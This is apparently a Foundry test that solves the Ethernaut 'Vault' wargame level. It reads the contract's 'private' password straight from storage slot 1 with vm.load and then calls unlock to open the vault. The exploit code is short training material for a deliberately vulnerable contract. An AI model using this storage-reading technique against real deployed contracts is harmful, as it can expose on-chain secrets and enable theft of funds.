// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Vault} from "ethernaut/levels/Vault.sol";

contract VaultTest is Test {
    Vault target;
    address player;

    function setUp() public {
        player = makeAddr("player");

        bytes32 password = keccak256("letmein");
        target = new Vault(password);
    }

    function attack() private {
        // access storage slot
        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
        target.unlock(password);
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertFalse(target.locked(), "vault should be unlocked");
    }
}
